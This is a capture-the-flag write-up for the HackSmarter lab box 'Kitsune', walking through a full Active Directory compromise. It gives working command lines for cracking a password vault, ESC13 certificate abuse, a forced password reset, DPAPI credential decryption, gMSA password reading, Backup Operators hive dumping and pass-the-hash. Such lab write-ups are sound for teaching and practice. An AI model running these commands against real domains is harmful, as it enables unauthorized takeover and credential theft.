---
title: HackSmarter - Kitsune
date: 2026-10-22
image: cover.png
tags: [HackSmarter, Easy, Windows, Active Directory]
excerpt: An easy HackSmarter Active Directory box where Guest access to a file share leaks a Password Safe vault. Cracking its master password yields a first domain user, and an AD CS ESC13 template links that user's certificate to the HelpDesk group, which holds write access over another account. From there an exported PSCredential file, ReadGMSAPassword, and Backup Operators membership lead to the Administrator hash and full domain compromise.
---

# Kitsune

You have been hired to perform an internal pentest against the client's Domain Controller. Your task is to identify all vulnerabilities and (if possible) fully compromise the Domain.

Kitsune is an easy-rated HackSmarter box built around a single Windows Server 2025 domain controller. The foothold comes from loot rather than an exploit: Guest access to a file share exposes a Password Safe vault whose master password cracks in seconds. From that first domain user the chain moves through AD CS ESC13 (an issuance policy that quietly grants group membership), an exported PSCredential file, a ReadGMSAPassword edge, and finally Backup Operators membership to dump the Administrator hash. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

## Unauthenticated Enumeration

### NMAP Scanning

The scan shows a classic domain controller: DNS, Kerberos, LDAP/LDAPS, SMB, RDP, and WinRM. The certificate bodies below are trimmed to their metadata, since the base64 blobs add nothing to the analysis.

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-10-22 17:12:10Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:   d44b:d58b:d60d:de16:8e25:54c7:79fa:4ca9
| SHA-1: 1656:60d1:a7d3:9544:8b6c:3318:bedb:0f08:1cb8:cd04
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:   d44b:d58b:d60d:de16:8e25:54c7:79fa:4ca9
| SHA-1: 1656:60d1:a7d3:9544:8b6c:3318:bedb:0f08:1cb8:cd04
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:   d44b:d58b:d60d:de16:8e25:54c7:79fa:4ca9
| SHA-1: 1656:60d1:a7d3:9544:8b6c:3318:bedb:0f08:1cb8:cd04
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:   d44b:d58b:d60d:de16:8e25:54c7:79fa:4ca9
| SHA-1: 1656:60d1:a7d3:9544:8b6c:3318:bedb:0f08:1cb8:cd04
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 126
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: KITSUNE
|   NetBIOS_Domain_Name: KITSUNE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: kitsune.local
|   DNS_Computer_Name: DC01.kitsune.local
|   DNS_Tree_Name: kitsune.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-22T17:13:07+00:00
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Issuer: commonName=DC01.kitsune.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-11T08:21:43
| Not valid after:  2027-04-12T08:21:43
| MD5:   b376:6ca1:5419:2d44:262e:0817:77ab:4bcf
| SHA-1: 0d55:4168:2732:d664:a4a3:77bd:e2f6:fb9e:02bf:dfae
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49736/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-10-22T17:13:07
|_  start_date: N/A
```

The host is `DC01.kitsune.local`, the domain controller for `kitsune.local`, with SMB signing required. The CA name in the LDAP certificates, `kitsune-DC01-CA`, also tells us Active Directory Certificate Services is installed - worth remembering for later.

### RPC Enumeration

{% image %}

A null session over RPC returns `NT_STATUS_ACCESS_DENIED`, so RPC needs a valid set of credentials before it gives us anything.

### SMB Enumeration

{% image2 %}

NULL authentication does not work either, but the `Guest` account does - and it has `READ` access to a non-default share called `Files`:

{% image3 %}

Before going further we generate a hosts file and a `krb5.conf` for the domain with NetExec:

```bash
➜  NetExec git:(main) ✗ poetry run NetExec smb 10.1.217.241 --generate-hosts-file hosts.txt
SMB         10.1.217.241    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
➜  NetExec git:(main) ✗ poetry run NetExec smb 10.1.217.241 --generate-krb5-file krb5.conf
SMB         10.1.217.241    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.1.217.241    445    DC01             [+] krb5 conf saved to: krb5.conf
SMB         10.1.217.241    445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
```

The `/etc/hosts` entry ends up as:

```bash
10.1.217.241	DC01.kitsune.local kitsune.local
```

### Looting the Files Share

Connecting to the `Files` share as Guest shows the following:

```bash
impacket-smbclient kitsune.local/Guest:''@10.1.217.241
```

{% image4 %}

We download everything with `mget *` and inspect it locally. Running `exiftool` against the PDFs turns up nothing unusual - no author fields we could turn into a username list:

{% image5 %}

The standout file is `logins.psafe3`, a Password Safe v3 database:

{% image6 %}

### Building a Username List

Among the PDFs, only `10-11-Timesheet.pdf` is useful: it lists employee names that we can turn into candidate usernames for spraying.

{% image7 %}

→ Name list:

```bash
Amara Okafor
Diego Marchetti
Jame Tanaka
Priya Nair
Lukas Brandt
Sofia Reyes
Tomoko Ishikawa
Marcus Bellamy
Elena Volkova
Kwame Asante
Hana Suzuki
```

We feed the names to `namemash.py` to generate common username formats and validate them against the DC with `kerbrute`:

{% image8 %}

Unfortunately, none of the generated usernames are valid in the domain, so the vault is the way forward.

## Initial Access: Cracking the Password Safe Vault

### KeePassXC and Password Safe

KeePassXC can import Password Safe databases, but here it rejects the file as malformed:

{% image9 %}

So we switch to Password Safe itself, which can be installed with `sudo apt install passwordsafe`. Opening the vault requires its master password:

{% image10 %}

To attack it offline, we extract a crackable hash with `pwsafe2john`:

{% image11 %}

John the Ripper then recovers the master password:

{% image12 %}

The master password is `hellokitty`. Opening the vault reveals three stored credentials:

{% image13 %}

→ Credentials:

1. Duo Login - admin : `I#zmE{z[n3HM`
2. Network Credentials - ranch : `R@nch2026!`
3. SQL Credentials - root : `a%KlRhqbuRgL`

The "Network Credentials" entry looks like a domain account, and a quick NetExec SMB query confirms it is valid:

{% image14 %}

## Domain Reconnaissance as ranch

### Collecting BloodHound Data

With a valid domain user, we collect BloodHound data with `rusthound`:

```bash
rusthound --domain kitsune.local --ldapusername 'ranch' --ldappassword 'R@nch2026!' --ldapfqdn DC01.kitsune.local --ldapip 10.1.217.241 --collectionmethod All --zip --ldaps
```

{% image15 %}

### Writable Objects with bloodyAD

Next we check which objects ranch can modify. Simple LDAP binds against this DC fail with `ERROR_DS_STRONG_AUTH_REQUIRED`, so we request a TGT and authenticate with Kerberos instead:

```bash
impacket-getTGT kitsune.local/ranch:'R@nch2026!' -dc-ip 10.1.217.241
```

{% image16 %}

With the ticket exported, we list ranch's writable objects:

```bash
bloodyAD --host DC01.kitsune.local -d kitsune.local -u 'ranch@kitsune.local' -k get writable
```

{% image17 %}

Nothing of interest - the only writable objects are ranch's own account and the default `Authenticated Users` (`S-1-5-11`) foreign security principal.

## AD CS: ESC13 to schlop

### Finding the Vulnerable Template

With ACLs a dead end, we turn to the certificate authority and look for vulnerable templates with Certipy:

```bash
certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.217.241 -vulnerable -stdout -enable
```

{% image18 %}

The `Kitsune-User` template is enrollable by `Domain Users`, allows client authentication, and has an issuance policy linked to the `HelpDesk` group. That is ESC13: when we authenticate with a certificate issued from this template, the domain controller adds `HelpDesk` membership to our ticket, even though ranch is not actually in that group.

### ESC13 Exploitation

→ Requesting a certificate from the `Kitsune-User` template:

```bash
certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.217.241 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -debug
```

{% image19 %}

→ Authenticating with the PFX over PKINIT to obtain a TGT that carries the `HelpDesk` membership:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx ranch.pfx -pfx-pass '' -dc-ip 10.1.217.241 'kitsune.local'/'ranch' 'ranch_esc13.ccache'
```

{% image20 %}

### Taking Over schlop

With `KRB5CCNAME` pointing at `ranch_esc13.ccache`, we list writable objects again. This time the `HelpDesk` membership gives us write access over the user `schlop`, including its owner and DACL:

```bash
bloodyAD --host DC01.kitsune.local -d kitsune.local -k get writable
```

{% image21 %}

That is enough to reset the account's password:

```bash
bloodyAD --host DC01.kitsune.local -d kitsune.local -k set password schlop 'Password123!'
```

{% image22 %}

schlop is a member of the `REMOTE MANAGEMENT USERS` group, so we can sign in over WinRM with the new password:

{% image23 %}

## Privilege Escalation to Domain Admin

### Decrypting a PSCredential File - pebble

In schlop's `Documents` folder, where the WinRM session lands, there is a file called `networkAuth.cred`:

{% image24 %}

This is a PowerShell credential exported with `Export-Clixml`. The password inside is a SecureString protected with DPAPI under schlop's account, so from schlop's own session we can simply import it and read the plaintext:

```bash
PS> $c = Import-Clixml C:\Users\schlop\Documents\networkAuth.cred
PS> $c.UserName
pebble
PS> $c.GetNetworkCredential().Password
PebbleIs47!
```

{% image25 %}

> [!NOTE] If schlop's session weren't available, the same blob can be decrypted offline. Download the DPAPI blob (the hex inside the `<SS>` element), schlop's master key file (`C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773590124-4237107295-2360938966-1105\dab45e01-2753-4167-952d-904a69c44031`) and, optionally, `CREDHIST`. Because we know schlop's password, the master key can be derived from it and the user's SID.

With SharpDPAPI, use the `blob` command (not `credentials`):

```bash
SharpDPAPI.exe blob /target:<hex blob> /mkfile:C:\Users\schlop\AppData\Roaming\Microsoft\Protect\S-1-5-21-3773590124-4237107295-2360938966-1105\dab45e01-2753-4167-952d-904a69c44031 /password:Password123! /sid:S-1-5-21-3773590124-4237107295-2360938966-1105
```

Or on Linux with Impacket's `dpapi.py`, decrypt the master key first and then the blob:

```bash
impacket-dpapi masterkey -file dab45e01-2753-4167-952d-904a69c44031 -sid S-1-5-21-3773590124-4237107295-2360938966-1105 -password 'Password123!'
impacket-dpapi unprotect -file blob.bin -key 0x<decrypted master key>
```

### pebble - ReadGMSAPassword

BloodHound shows that pebble is a member of the `IT` group, which can read the gMSA password of `SVC_GMSA$`:

{% image26 %}

NetExec can retrieve it directly:

```bash
poetry run NetExec ldap 10.1.217.241 -u 'pebble' -p 'PebbleIs47!' --gmsa
```

{% image27 %}

### SVC_GMSA$ - Backup Operators

Checking the groups of `SVC_GMSA$` shows it is a member of `BACKUP OPERATORS`:

{% image28 %}

Backup Operators can save the `SAM`, `SYSTEM`, and `SECURITY` hives from the domain controller remotely. NetExec's `backup_operator` module automates the whole process - saving the hives, downloading them, and dumping the hashes:

```bash
poetry run NetExec smb 10.1.217.241 -u 'svc_gmsa$' -H 085691c182d60ab1a12466ce7b50d29d -M backup_operator
```

{% image29 %}

Finally, we pass the Administrator NTLM hash to `evil-winrm` and read the final flag from the Administrator's Desktop:

{% image30 %}

Kitsune is rated easy, and each step is short, but it covers a lot of ground: looting an exposed share, cracking a password manager vault, ESC13 (one of the less common AD CS escalations, where a certificate grants group membership instead of impersonation), DPAPI-protected PowerShell credentials, gMSA password retrieval, and Backup Operators abuse. It is a good box for practising how small misconfigurations chain together into full domain compromise.
